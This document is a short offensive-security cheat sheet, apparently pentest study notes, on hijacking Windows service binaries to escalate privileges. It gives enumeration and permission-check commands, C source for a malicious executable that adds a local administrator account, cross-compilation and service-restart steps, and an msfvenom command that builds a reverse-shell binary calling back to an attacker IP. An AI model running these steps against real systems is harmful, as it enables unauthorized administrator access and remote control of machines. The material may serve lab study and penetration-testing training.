# Service Binary Hijacking

Services with insecure binary permissions can be replaced with malicious executables.

**Enumerate running services with paths:**
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}
# OR
Get-CimInstance -ClassName win32_service -Filter "State='Running'" | Select Name,State,PathName,StartName
```

> Services outside `C:\Windows\system32\` are potentially user-installed and more likely vulnerable.

> `Get-CimInstance` and `Get-Service` may return "permission denied" over WinRM/bind shells — use RDP/interactive logon instead.

**Check write permissions:**
```powershell
icacls <path>    # F=Full, M=Modify, RX=Read+Execute, R=Read, W=Write
```

**Malicious binary (adds user + makes admin):**
```c
#include <stdlib.h>
int main(void) {
  system("net user misthos password123! /add");
  system("net localgroup administrators misthos /add");
  return 0;
}
```

**Cross-compile for Windows:**
```bash
sudo apt install mingw-w64
x86_64-w64-mingw32-gcc malicious.c -o malicious.exe   # 64-bit
i686-w64-mingw32-gcc malicious.c -o malicious.exe      # 32-bit
```

**Service control:**
```cmd
net stop mysqld
net start mysqld
```

**Check startup type + reboot if Automatic:**
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
# If Automatic + SeShutdownPrivilege:
shutdown /r /t 0
```

**After adding a local admin user — gain full privileges:**
```cmd
runas /profile /user:misthos cmd.exe
```
Or RDP / sign-out and login as the new user.

**msfvenom reverse shell binary:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp --arch x64 LHOST=192.168.45.188 LPORT=9002 -f exe -o shell.exe
```
